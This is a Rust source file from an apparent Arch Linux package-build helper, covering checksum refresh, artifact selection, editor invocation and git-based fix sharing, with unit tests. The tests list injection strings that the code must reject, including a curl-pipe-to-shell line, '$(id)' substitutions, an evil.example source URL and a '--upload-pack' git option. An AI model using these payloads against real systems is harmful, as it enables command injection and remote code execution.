            Err(e) => eprintln!("note: {e}"),
        }
    }
    // 3. checksum refresh — ONLY behind the explicit flag, always printed
    if policy.allow_checksum_refresh
        && diagnoses
            .iter()
            .any(|d| matches!(d.class, FailureClass::ChecksumMismatch(_)))
    {
        // the PKGBUILD that was just built and failed: the directory the
        // caller builds in, whichever lane that is (the AUR lane builds in
        // ./NAME-aur-build, not under the recipes root)
        refresh_checksums(dir, build_user, policy.sandbox)?;
        applied.push(format!(
            "checksum refresh of {} (--allow-checksum-refresh; old/new hashes printed)",
            dir.join("PKGBUILD").display()
        ));
    }
    Ok(applied)
}

/// Recompute the checksum arrays of `dir/PKGBUILD` with `makepkg -g` and
/// replace them in that file.
fn refresh_checksums(
    dir: &Path,
    build_user: Option<&str>,
    sandbox: crate::sandbox::Policy,
) -> Result<(), String> {
    let pb_path = dir.join("PKGBUILD");
    if !fs::symlink_metadata(&pb_path).is_ok_and(|m| m.is_file()) {
        return Err(format!(
            "{} is not a regular file; no checksum was changed",
            pb_path.display()
        ));
    }
    let run_as = build_identity(build_user)?;
    let mut prepared = crate::sandbox::command(
        dir,
        crate::sandbox::Net::Shared,
        sandbox,
        run_as,
        &["makepkg", "-g"],
    )?;
    let out = prepared
        .command
        .output()
        .map_err(|e| format!("makepkg -g failed: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "makepkg -g failed: {}; {} was not changed",
            String::from_utf8_lossy(&out.stderr).trim(),
            pb_path.display()
        ));
    }
    let sums = String::from_utf8_lossy(&out.stdout).trim().to_string();
    // stdout comes from a process that sourced the PKGBUILD: only checksum
    // arrays go back into the file, nothing else it may have printed
    if !valid_sums_output(&sums) {
        return Err(format!(
            "makepkg -g printed something other than checksum arrays; {} was not changed",
            pb_path.display()
        ));
    }
    let pb = fs::read_to_string(&pb_path).map_err(|e| e.to_string())?;
    let refreshed = refresh_line(&pb, &sums);
    let old: Vec<&str> = pb.lines().filter(|l| is_sums_assignment(l)).collect();
    println!(
        "autorepair: checksum refresh of {}\n  old: {}",
        pb_path.display(),
        if old.is_empty() {
            "(none)".to_string()
        } else {
            old.join("\n       ")
        }
    );
    println!("  new: {}", sums.replace('\n', "\n       "));
    crate::recipe::replace_file(&pb_path, &refreshed)
        .map_err(|e| format!("cannot write {}: {e}", pb_path.display()))?;
    Ok(())
}

/// Names of the checksum arrays makepkg knows (`sha256sums`,
/// `b2sums_x86_64`, ...).
fn is_sums_name(ident: &str) -> bool {
    let (algo, arch) = match ident.split_once("sums") {
        Some((algo, "")) => (algo, None),
        Some((algo, rest)) => match rest.strip_prefix('_') {
            Some(arch) => (algo, Some(arch)),
            None => return false,
        },
        None => return false,
    };
    matches!(
        algo,
        "ck" | "md5" | "sha1" | "sha224" | "sha256" | "sha384" | "sha512" | "b2"
    ) && arch
        .is_none_or(|a| !a.is_empty() && a.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_'))
}

/// Does this PKGBUILD line start a checksum array?
fn is_sums_assignment(line: &str) -> bool {
    line.trim_start()
        .split_once('=')
        .is_some_and(|(ident, _)| is_sums_name(ident))
}

/// Is `out` exactly what `makepkg -g` prints: one or more arrays
/// `NAMEsums=('hex' 'SKIP' ...)`, and nothing else?
fn valid_sums_output(out: &str) -> bool {
    let mut rest = out.trim();
    if rest.is_empty() {
        return false;
    }
    while !rest.is_empty() {
        let Some((ident, after)) = rest.split_once("=(") else {
            return false;
        };
        let Some((body, tail)) = after.split_once(')') else {
            return false;
        };
        let items_ok = body.split_whitespace().all(|item| {
            item.strip_prefix('\'')
                .and_then(|i| i.strip_suffix('\''))
                .is_some_and(|i| {
                    i == "SKIP" || (!i.is_empty() && i.bytes().all(|b| b.is_ascii_hexdigit()))
                })
        });
        if !is_sums_name(ident) || !items_ok {
            return false;
        }
        rest = tail.trim_start();
    }
    true
}

/// Replace every checksum array of `pkgbuild` (single or multi-line, any
/// algorithm) by `new_sums`, at the place of the first one; a PKGBUILD
/// without any gets them appended.
fn refresh_line(pkgbuild: &str, new_sums: &str) -> String {
    let mut out = String::new();
    let mut replaced = false;
    let mut in_multiline = false;
    for line in pkgbuild.lines() {
        if in_multiline {
            if line.contains(')') {
                in_multiline = false;
            }
            continue;
        }
        if is_sums_assignment(line) {
            if !line.contains(')') {
                in_multiline = true; // multiline array
            }
            if !replaced {
                out.push_str(new_sums);
                out.push('\n');
                replaced = true;
            }
            continue;
        }
        out.push_str(line);
        out.push('\n');
    }
    if !replaced {
        out.push_str(new_sums);
        out.push('\n');
    }
    out
}

/// Suffixes of a built package file after `.pkg.tar` (makepkg's `PKGEXT`).
const PKG_COMPRESSIONS: &[&str] = &["zst", "xz", "gz", "bz2", "lz4", "lzo", "lz", "lrz", "Z"];

/// `NAME-VERSION-RELEASE-ARCH` of a package file name, or `None` when the
/// name is not exactly a package file: `.sig` signatures, `.part`
/// downloads, backups and anything else that merely contains `.pkg.tar`.
fn package_stem(file_name: &str) -> Option<&str> {
    let stem = file_name.strip_suffix(".pkg.tar").or_else(|| {
        PKG_COMPRESSIONS.iter().find_map(|ext| {
            file_name
                .strip_suffix(ext)
                .and_then(|s| s.strip_suffix(".pkg.tar."))
        })
    })?;
    package_name(stem).map(|_| stem)
}

/// The package name of a `NAME-VERSION-RELEASE-ARCH` stem.
fn package_name(stem: &str) -> Option<&str> {
    let mut fields = stem.rsplitn(4, '-');
    let (arch, rel, ver) = (fields.next()?, fields.next()?, fields.next()?);
    let name = fields.next()?;
    (crate::util::valid_pkg_name(name) && !arch.is_empty() && !rel.is_empty() && !ver.is_empty())
        .then_some(name)
}

pub fn is_package_file_name(file_name: &str) -> bool {
    package_stem(file_name).is_some()
}

/// One entry of the build directory whose name contains `.pkg.tar`.
#[derive(Clone, Debug)]
struct Candidate {
    name: String,
    /// a regular file itself (not a link, not a directory)
    regular: bool,
    modified: Option<std::time::SystemTime>,
}

#[derive(Debug, Default, PartialEq)]
struct Selection {
    keep: Vec<String>,
    /// `(file name, why it is not used)`
    skipped: Vec<(String, &'static str)>,
}

/// Which files of the build directory are the packages of THIS build.
///
/// `expected` is what `makepkg --packagelist` names for the PKGBUILD as it
/// was built (exact, when available); without it a file must at least not
/// be older than the start of the build. Debug-symbol packages are left
/// out unless the user asked for that very package.
fn select_artifacts(
    present: &[Candidate],
    expected: Option<&[String]>,
    started: std::time::SystemTime,
    wanted: &str,
) -> Selection {
    let mut sel = Selection::default();
    for c in present {
        let why = match package_stem(&c.name) {
            _ if !c.regular => Some("it is not a regular file"),
            None => Some("it is not a package file"),
            Some(stem) => {
                let name = package_name(stem).unwrap_or_default();
                if expected.is_some_and(|e| !e.contains(&c.name)) {
                    Some("this recipe version does not build it (left over from an earlier build)")
                } else if expected.is_none() && c.modified.is_none_or(|m| m < started) {
                    Some("it is older than this build")
                } else if name.ends_with("-debug") && name != wanted {
                    Some("it is a debug-symbols package")
                } else {
                    None
                }
            }
        };
        match why {
            Some(why) => sel.skipped.push((c.name.clone(), why)),
            None => sel.keep.push(c.name.clone()),
        }
    }
    sel.keep.sort();
    sel.skipped.sort();
    sel
}

/// File names `makepkg --packagelist` gives for the PKGBUILD in `dir`.
/// Sourcing a PKGBUILD runs code, so this goes through the sandbox too.
fn expected_package_files(
    dir: &Path,
    build_user: Option<&str>,
    policy: &RepairPolicy,
) -> Option<Vec<String>> {
    let run_as = build_identity(build_user).ok()?;
    let mut prepared = crate::sandbox::command(
        dir,
        crate::sandbox::Net::Isolated,
        policy.sandbox,
        run_as,
        &["makepkg", "--packagelist"],
    )
    .ok()?;
    let out = prepared.command.output().ok()?;
    if !out.status.success() {
        return None;
    }
    let names: Vec<String> = String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|l| {
            Path::new(l.trim())
                .file_name()?
                .to_str()
                .map(str::to_string)
        })
        .filter(|n| is_package_file_name(n))
        .collect();
    (!names.is_empty()).then_some(names)
}

/// The package files a successful build left in `dir`.
fn collect_artifacts(
    dir: &Path,
    build_user: Option<&str>,
    policy: &RepairPolicy,
    started: std::time::SystemTime,
) -> Result<Vec<PathBuf>, String> {
    let mut present = Vec::new();
    for e in fs::read_dir(dir).map_err(|e| e.to_string())?.flatten() {
        let name = e.file_name().to_string_lossy().to_string();
        if !name.contains(".pkg.tar") {
            continue;
        }
        let meta = fs::symlink_metadata(e.path()).ok();
        present.push(Candidate {
            name,
            regular: meta.as_ref().is_some_and(|m| m.is_file()),
            modified: meta.and_then(|m| m.modified().ok()),
        });
    }
    let expected = expected_package_files(dir, build_user, policy);
    let mut sel = select_artifacts(&present, expected.as_deref(), started, &policy.pkg);
    if sel.keep.is_empty() && expected.is_some() {
        // the list names nothing that is here (it was printed for another
        // PKGEXT, say): fall back to "a package file made by this build"
        sel = select_artifacts(&present, None, started, &policy.pkg);
    }
    for (name, why) in &sel.skipped {
        println!("not using {name}: {why}");
    }
    if sel.keep.is_empty() {
        return Err(format!(
            "the build reported success but left no package file of this build in {}; nothing was installed",
            dir.display()
        ));
    }
    Ok(sel.keep.iter().map(|n| dir.join(n)).collect())
}

/// Split `$EDITOR` into a program and its arguments on whitespace
/// (`code -w`, `emacsclient -t`). No shell is involved.
fn editor_argv(editor: &str) -> Vec<String> {
    let argv: Vec<String> = editor.split_whitespace().map(str::to_string).collect();
    if argv.is_empty() {
        vec!["vi".to_string()]
    } else {
        argv
    }
}

/// Open `pkgbuild` in `editor`. `Ok(true)` only when the editor ran, ended
/// successfully AND the file is different afterwards; an editor that could
/// not be started or that failed is an error, and an unchanged file is not
/// a repair.
fn edit_recipe(pkgbuild: &Path, editor: &str) -> Result<bool, String> {
    let before = fs::read(pkgbuild).ok();
    let argv = editor_argv(editor);
    let status = Command::new(&argv[0])
        .args(&argv[1..])
        .arg(pkgbuild)
        .status()
        .map_err(|e| {
            format!(
                "the editor '{}' could not be started ({e}); {} was not changed",
                argv[0],
                pkgbuild.display()
            )
        })?;
    if !status.success() {
        return Err(format!(
            "the editor '{}' ended with {status}; the build was not repeated",
            argv[0]
        ));
    }
    Ok(fs::read(pkgbuild).ok() != before)
}

/// Build with the repair loop. On success, returns the artifacts and (when
/// policy.record_fix and a repair actually fired) records a FixRecord.
pub fn build_with_repair(
    dir: &Path,
    build_user: Option<&str>,
    policy: &RepairPolicy,
) -> Result<Vec<PathBuf>, String> {
    let mut attempts: Vec<AttemptLog> = Vec::new();
    let mut repaired = false;
    let started = std::time::SystemTime::now();
    let max = if policy.enabled {
        policy.max_attempts.max(1)
    } else {
        1
    };
    for n in 1..=max {
        let res = makepkg_attempt(dir, build_user, policy);
        let tail = |out: &str| -> String {
            out.lines()
                .rev()
                .take(12)
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect::<Vec<_>>()
                .join("\n")
        };
        match res {
            Ok(()) => {
                if repaired && policy.record_fix && !policy.pkg.is_empty() {
                    let rec = FixRecord {
                        pkg: policy.pkg.clone(),
                        lane: policy.lane.clone(),
                        timestamp: std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .map(|d| d.as_secs())
                            .unwrap_or(0),
                        failure_classes: attempts
                            .iter()
                            .flat_map(|a| a.diagnoses.clone())
                            .collect(),
                        strategies_applied: attempts
                            .iter()
                            .flat_map(|a| a.strategies_applied.clone())
                            .collect(),
                        recipe: fs::read_to_string(dir.join("PKGBUILD")).unwrap_or_default(),
                        notes: format!("auto-repaired by yapacc after {} attempt(s)", n),
                        yapacc_version: env!("CARGO_PKG_VERSION").into(),
                    };
                    match record_fix(&rec) {
                        Ok(p) => println!(
                            "fix recorded: {} (share with `yapacc fixes push`)",
                            p.display()
                        ),
                        Err(e) => eprintln!("warning: fix recording failed: {e}"),
                    }
                }
                return collect_artifacts(dir, build_user, policy, started);
            }
            Err(out) => {
                let diagnoses = parse_failures(&out);
                let names: Vec<String> =
                    diagnoses.iter().map(|d| format!("{:?}", d.class)).collect();
                println!(
                    "\n== autorepair: attempt {n}/{} failed — {} diagnosis(ies) ==",
                    max,
                    diagnoses.len()
                );
                for d in &diagnoses {
                    println!(
                        "  [{}] {} → {}",
                        if d.auto { "auto" } else { "gated" },
                        d.evidence,
                        d.repair
                    );
                }
                let mut strategies = Vec::new();
                if n < max {
                    match apply_auto_strategies(&diagnoses, dir, build_user, policy) {
                        Ok(s) => strategies = s,
                        Err(e) => {
                            attempts.push(AttemptLog {
                                n,
                                diagnoses: names,
                                strategies_applied: strategies.clone(),
                                output_tail: tail(&out),
                            });
                            return Err(format!(
                                "autorepair strategy failed: {e}\nlast output:\n{}",
                                tail(&out)
                            ));
                        }
                    }
                    if !strategies.is_empty() {
                        repaired = true;
                        attempts.push(AttemptLog {
                            n,
                            diagnoses: names,
                            strategies_applied: strategies.clone(),
                            output_tail: tail(&out),
                        });
                        println!("  applying: {}", strategies.join("; "));
                        continue;
                    }
                }
                // nothing auto-applicable: gated/manual path
                let mut manual = String::new();
                if n < max
                    && policy.interactive
                    && diagnoses.iter().any(|d| {
                        matches!(
                            d.class,
                            FailureClass::BuildError(_) | FailureClass::SourceGone(_)
                        )
                    })
                {
                    println!(
                        "  manual fixer: opening the recipe in $EDITOR; save & quit to rebuild"
                    );
                    let editor = std::env::var("EDITOR").unwrap_or_default();
                    // a repair only if the editor ran and the recipe changed
                    match edit_recipe(&dir.join("PKGBUILD"), &editor) {
                        Ok(true) => {
                            repaired = true;
                            attempts.push(AttemptLog {
                                n,
                                diagnoses: names,
                                strategies_applied: vec!["manual edit ($EDITOR)".into()],
                                output_tail: tail(&out),
                            });
                            continue;
                        }
                        Ok(false) => {
                            manual = "\nThe recipe was not changed in the editor, so the build was not repeated.".into();
                        }
                        Err(why) => manual = format!("\nManual fix not done: {why}."),
                    }
                }
                attempts.push(AttemptLog {
                    n,
                    diagnoses: names,
                    strategies_applied: strategies,
                    output_tail: tail(&out),
                });
                return Err(format!(
                    "build failed; no automatic strategy applies. Diagnoses:\n{}\nLast output:\n{}{manual}\n(edit {}, or pass --allow-checksum-refresh for checksum refresh)",
                    attempts
                        .last()
                        .map(|a| a.diagnoses.join(", "))
                        .unwrap_or_default(),
                    tail(&out),
                    dir.join("PKGBUILD").display()
                ));
            }
        }
    }
    Err("build_with_repair: exhausted attempts".into())
}

#[cfg(test)]
mod runner_tests {
    use super::*;

    #[test]
    fn checksum_refresh_replaces_array() {
        let pb = "pkgname=x\nsha256sums=('SKIP')\nbuild() { :\n}\n";
        let out = refresh_line(pb, "sha256sums=('abc')");
        assert!(out.contains("sha256sums=('abc')"));
        assert!(!out.contains("SKIP"));
        // multiline array
        let pb2 = "pkgname=x\nsha256sums=(\n  'a'\n  'b'\n)\npackage() { :; }\n";
        let out2 = refresh_line(pb2, "sha256sums=('c')");
        assert!(out2.contains("sha256sums=('c')"));
        assert!(!out2.contains("'a'"));
        assert!(out2.contains("package()"));
    }

    #[test]
    fn policy_defaults_are_safe() {
        let p = RepairPolicy::default();
        assert!(p.enabled);
        assert_eq!(p.max_attempts, 3);
        assert!(!p.allow_checksum_refresh, "checksum refresh must be opt-in");
    }

    fn scratch(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!(
            "yapacc-repair-test-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        fs::create_dir_all(&d).unwrap();
        d
    }

    // ---- checksum refresh (finding 19) --------------------------------

    /// AUR packages mostly carry sha512sums or b2sums; a refresh that only
    /// knew `sha256sums=` left those PKGBUILDs unchanged.
    #[test]
    fn checksum_refresh_replaces_arrays_of_any_algorithm() {
        let pb =
            "pkgname=x\nsha512sums=('old1'\n            'old2')\nb2sums=('old3')\nbuild() { :; }\n";
        let out = refresh_line(pb, "sha512sums=('aa'\n            'bb')\nb2sums=('cc')");
        assert_eq!(
            out,
            "pkgname=x\nsha512sums=('aa'\n            'bb')\nb2sums=('cc')\nbuild() { :; }\n"
        );
        // per-architecture arrays go too; other variables stay
        let pb = "sums=('keep')\nsha256sums_x86_64=('old')\nmd5sums=('old')\n";
        let out = refresh_line(pb, "sha256sums_x86_64=('aa')");
        assert_eq!(out, "sums=('keep')\nsha256sums_x86_64=('aa')\n");
        // a PKGBUILD without any array gets one
        let out = refresh_line("pkgname=x\n", "sha256sums=('aa')");
        assert_eq!(out, "pkgname=x\nsha256sums=('aa')\n");
    }

    #[test]
    fn only_checksum_arrays_are_accepted_from_makepkg_g() {
        for good in [
            "sha256sums=('SKIP')",
            "sha256sums=('0123abcdef'\n            'SKIP')",
            "sha512sums=('aa')\nb2sums=('bb')\nsha256sums_aarch64=('cc')",
            "md5sums=()",
        ] {
            assert!(valid_sums_output(good), "refused {good:?}");
        }
        for bad in [
            "",
            "build() { curl evil | sh; }",
            "sha256sums=('aa')\nbuild() { evil; }",
            "sha256sums=('aa'); evil",
            "sha256sums=('$(id)')",
            "sha256sums=(`id`)",
            "sha256sums=('aa' \"bb\")",
            "sha256sums=('zz')",
            "source=('https://evil.example/x')",
            "sha256sums=('aa'",
            "evilsums=('aa')",
            "sha256sums_$(id)=('aa')",
        ] {
            assert!(!valid_sums_output(bad), "accepted {bad:?}");
        }
    }

    // ---- built artifacts (finding 25) ---------------------------------

    fn cand(name: &str) -> Candidate {
        Candidate {
            name: name.into(),
            regular: true,
            modified: Some(std::time::SystemTime::now()),
        }
    }

    #[test]
    fn package_file_names_are_matched_exactly_not_by_substring() {
        for yes in [
            "foo-1.0-1-x86_64.pkg.tar.zst",
            "foo-1.0-1-any.pkg.tar.xz",
            "foo-bar-2:1.0.r3.gabc-2-x86_64.pkg.tar",
            "lib32-foo+-1.0-1-x86_64.pkg.tar.gz",
        ] {
            assert!(is_package_file_name(yes), "refused {yes}");
        }
        for no in [
            "foo-1.0-1-x86_64.pkg.tar.zst.sig",
            "foo-1.0-1-x86_64.pkg.tar.zst.part",
            "foo-1.0-1-x86_64.pkg.tar.zst~",
            "foo-1.0-1-x86_64.pkg.tar.zst.bak",
            "notes-about.pkg.tar.txt",
            "foo.pkg.tar.zst",
            "-1.0-1-x86_64.pkg.tar.zst",
            "foo-1.0-1-x86_64.src.tar.gz",
            ".pkg.tar.zst",
        ] {
            assert!(!is_package_file_name(no), "accepted {no}");
        }
    }

    #[test]
    fn only_the_packages_of_this_build_are_selected() {
        let now = std::time::SystemTime::now();
        let present = vec![
            cand("foo-1.1-1-x86_64.pkg.tar.zst"),
            cand("foo-1.1-1-x86_64.pkg.tar.zst.sig"),
            cand("foo-debug-1.1-1-x86_64.pkg.tar.zst"),
            cand("foo-1.0-1-x86_64.pkg.tar.zst"),
            cand("foo-docs-1.1-1-any.pkg.tar.zst"),
        ];
        let expected = vec![
            "foo-1.1-1-x86_64.pkg.tar.zst".to_string(),
            "foo-docs-1.1-1-any.pkg.tar.zst".to_string(),
            "foo-debug-1.1-1-x86_64.pkg.tar.zst".to_string(),
        ];
        let sel = select_artifacts(&present, Some(&expected), now, "foo");
        assert_eq!(
            sel.keep,
            vec![
                "foo-1.1-1-x86_64.pkg.tar.zst",
                "foo-docs-1.1-1-any.pkg.tar.zst"
            ]
        );
        let why = |n: &str| {
            sel.skipped
                .iter()
                .find(|(name, _)| name == n)
                .map(|(_, w)| *w)
                .unwrap_or("(kept)")
        };
        assert!(why("foo-1.1-1-x86_64.pkg.tar.zst.sig").contains("not a package file"));
        assert!(why("foo-debug-1.1-1-x86_64.pkg.tar.zst").contains("debug"));
        assert!(why("foo-1.0-1-x86_64.pkg.tar.zst").contains("earlier build"));

        // a package the user asked for by its -debug name is kept
        let sel = select_artifacts(&present, Some(&expected), now, "foo-debug");
        assert!(
            sel.keep
                .iter()
                .any(|i| i == "foo-debug-1.1-1-x86_64.pkg.tar.zst")
        );
    }

    #[test]
    fn without_a_package_list_a_stale_file_is_told_by_its_age() {
        let started = std::time::SystemTime::now();
        let before = started - std::time::Duration::from_secs(3600);
        let after = started + std::time::Duration::from_secs(5);
        let at = |name: &str, t| Candidate {
            name: name.into(),
            regular: true,
            modified: Some(t),
        };
        let present = vec![
            at("foo-1.1-1-x86_64.pkg.tar.zst", after),
            at("foo-1.0-1-x86_64.pkg.tar.zst", before),
            at("foo-1.1-1-x86_64.pkg.tar.zst.sig", after),
            Candidate {
                name: "bar-1.1-1-x86_64.pkg.tar.zst".into(),
                regular: false, // a link or a directory
                modified: Some(after),
            },
            Candidate {
                name: "baz-1.1-1-x86_64.pkg.tar.zst".into(),
                regular: true,
                modified: None,
            },
        ];
        let sel = select_artifacts(&present, None, started, "foo");
        assert_eq!(sel.keep, vec!["foo-1.1-1-x86_64.pkg.tar.zst"]);
        assert_eq!(sel.skipped.len(), 4);
    }

    // ---- $EDITOR (finding 25) -----------------------------------------

    #[test]
    fn editor_is_split_on_whitespace_without_a_shell() {
        assert_eq!(editor_argv("vim"), vec!["vim"]);
        assert_eq!(editor_argv("code -w"), vec!["code", "-w"]);
        assert_eq!(editor_argv("  "), vec!["vi"]);
        assert_eq!(editor_argv(""), vec!["vi"]);
        // shell syntax is data, not syntax
        assert_eq!(editor_argv("vim;id"), vec!["vim;id"]);
    }

    #[test]
    fn a_failed_or_idle_editor_is_not_a_repair() {
        use std::os::unix::fs::PermissionsExt;
        let d = scratch("editor");
        let pb = d.join("PKGBUILD");
        fs::write(&pb, "pkgname=x\n").unwrap();

        // the editor cannot be started
        let e = edit_recipe(&pb, "/nonexistent/yapacc-test-editor").unwrap_err();
        assert!(e.contains("could not be started"), "{e}");
        assert!(e.contains("was not changed"), "{e}");
        // the editor fails
        let e = edit_recipe(&pb, "false").unwrap_err();
        assert!(e.contains("the build was not repeated"), "{e}");
        // the editor runs and the file is left as it was
        assert_eq!(edit_recipe(&pb, "true"), Ok(false));
        assert_eq!(fs::read_to_string(&pb).unwrap(), "pkgname=x\n");

        // an editor that changes the file is a repair; its arguments are
        // passed on and the PKGBUILD path comes last
        let editor = d.join("append-editor");
        fs::write(&editor, "#!/bin/sh\necho \"# edited $1\" >> \"$2\"\n").unwrap();
        fs::set_permissions(&editor, fs::Permissions::from_mode(0o755)).unwrap();
        let with_arg = format!("{} flag", editor.display());
        assert_eq!(edit_recipe(&pb, &with_arg), Ok(true));
        assert_eq!(
            fs::read_to_string(&pb).unwrap(),
            "pkgname=x\n# edited flag\n"
        );
        let _ = fs::remove_dir_all(&d);
    }

    // ---- fix store: push / pull on ordinary states (finding 25) --------

    /// git without the user's configuration: no identity, no signing, no
    /// prompts. This is also the "fresh account" state push/pull must handle.
    const BARE_ENV: &[(&str, &str)] = &[
        ("GIT_CONFIG_GLOBAL", "/dev/null"),
        ("GIT_CONFIG_SYSTEM", "/dev/null"),
        ("GIT_CONFIG_NOSYSTEM", "1"),
        ("GIT_TERMINAL_PROMPT", "0"),
    ];

    fn bare_remote(root: &Path) -> String {
        let remote = root.join("remote.git");
        let ok = Command::new("git")
            .args(["init", "-q", "--bare"])
            .arg(&remote)
            .envs(BARE_ENV.iter().copied())
            .status()
            .unwrap()
            .success();
        assert!(ok);
        remote.display().to_string()
    }

    fn add_fix(store: &Path, pkg: &str) {
        fs::create_dir_all(store.join(pkg)).unwrap();
        fs::write(
            store.join(pkg).join("fix.json"),
            format!("{{\"pkg\":\"{pkg}\"}}\n"),
        )
        .unwrap();
        fs::write(store.join(pkg).join("PKGBUILD"), format!("pkgname={pkg}\n")).unwrap();
    }

    fn remote_log(remote: &str) -> String {
        let out = Command::new("git")
            .args([
                "--git-dir",
                remote,
                "log",
                "--all",
                "--oneline",
                "--name-only",
            ])
            .envs(BARE_ENV.iter().copied())
            .output()
            .unwrap();
        String::from_utf8_lossy(&out.stdout).to_string()
    }

    #[test]
    fn fixes_push_works_repeatedly_and_with_nothing_new() {
        if !crate::util::have("git") {
            return;
        }
        let root = scratch("push");
        let remote = bare_remote(&root);
        let store = root.join("store");

        // nothing recorded yet: not an error, and nothing is pushed
        let said = push_store(&store, &remote, BARE_ENV).unwrap();
        assert!(said.contains("nothing was pushed"), "{said}");
        assert!(remote_log(&remote).is_empty());

        add_fix(&store, "alpha");
        let said = push_store(&store, &remote, BARE_ENV).unwrap();
        assert!(said.starts_with("fixes pushed to"), "{said}");
        assert!(remote_log(&remote).contains("alpha/fix.json"));

        // the second push has nothing to commit: `git commit` used to fail
        let said = push_store(&store, &remote, BARE_ENV).unwrap();
        assert!(said.contains("nothing new to commit"), "{said}");

        add_fix(&store, "beta");
        push_store(&store, &remote, BARE_ENV).unwrap();
        assert!(remote_log(&remote).contains("beta/fix.json"));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn fixes_pull_works_into_a_store_that_already_holds_local_fixes() {
        if !crate::util::have("git") {
            return;
        }
        let root = scratch("pull");
        let remote = bare_remote(&root);
        let a = root.join("machine-a");
        let b = root.join("machine-b");

        // an empty remote is not an error
        let said = pull_store(&b, &remote, BARE_ENV).unwrap();
        assert!(said.contains("nothing was pulled"), "{said}");

        add_fix(&a, "alpha");
        push_store(&a, &remote, BARE_ENV).unwrap();

        // b recorded a fix before its first pull: the store is a non-empty
        // directory, which `git clone` refused
        add_fix(&b, "beta");
        let said = pull_store(&b, &remote, BARE_ENV).unwrap();
        assert!(said.starts_with("fixes pulled from"), "{said}");
        assert!(b.join("alpha/fix.json").is_file(), "the shared fix arrived");
        assert!(b.join("beta/fix.json").is_file(), "the local fix is kept");

        // pulling again, and pushing the local fix back, both work
        pull_store(&b, &remote, BARE_ENV).unwrap();
        push_store(&b, &remote, BARE_ENV).unwrap();
        assert!(remote_log(&remote).contains("beta/fix.json"));

        // a has a commit the remote lacks and the remote has one a lacks:
        // the pull merges, the push then succeeds
        add_fix(&a, "gamma");
        let e = push_store(&a, &remote, BARE_ENV).unwrap_err();
        assert!(e.contains("Nothing was pushed"), "{e}");
        assert!(e.contains("yapacc fixes pull"), "{e}");
        pull_store(&a, &remote, BARE_ENV).unwrap();
        assert!(a.join("beta/fix.json").is_file());
        assert!(a.join("gamma/fix.json").is_file());
        push_store(&a, &remote, BARE_ENV).unwrap();
        assert!(remote_log(&remote).contains("gamma/fix.json"));
        // one branch on the remote, not one per machine
        let heads = Command::new("git")
            .args(["--git-dir", &remote, "for-each-ref", "refs/heads"])
            .output()
            .unwrap();
        assert_eq!(String::from_utf8_lossy(&heads.stdout).lines().count(), 1);
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn a_fix_remote_that_git_would_read_as_an_option_is_refused() {
        let root = scratch("remote-option");
        let store = root.join("store");
        for remote in ["--upload-pack=touch pwned", "-x", ""] {
            let e = push_store(&store, remote, BARE_ENV).unwrap_err();
            assert!(e.contains("nothing was done"), "{e}");
            let e = pull_store(&store, remote, BARE_ENV).unwrap_err();
            assert!(e.contains("nothing was done"), "{e}");
        }
        assert!(!store.exists(), "the store is not even created");
        let _ = fs::remove_dir_all(&root);
    }
}
